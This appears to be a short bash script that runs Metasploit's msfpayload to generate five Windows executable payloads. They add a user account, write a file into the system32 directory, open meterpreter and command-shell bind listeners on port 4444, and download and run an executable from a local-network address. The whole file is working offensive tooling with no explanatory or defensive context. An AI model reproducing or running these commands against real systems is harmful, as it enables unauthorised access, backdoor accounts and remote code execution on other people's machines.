#!/usr/bin/env bash

msfpayload windows/adduser USER=test PASS=test X > adduser.exe
msfpayload windows/exec CMD="echo > %windir%/system32/test" X > write_sys32.exe
msfpayload windows/meterpreter/bind_tcp LPORT=4444 X > met_bind4444.exe
msfpayload windows/shell/bind_tcp LPORT=4444 X > shell_bind4444.exe
msfpayload windows/download_exec URL=http://192.168.7.25/exec.exe X > urlexec.exe
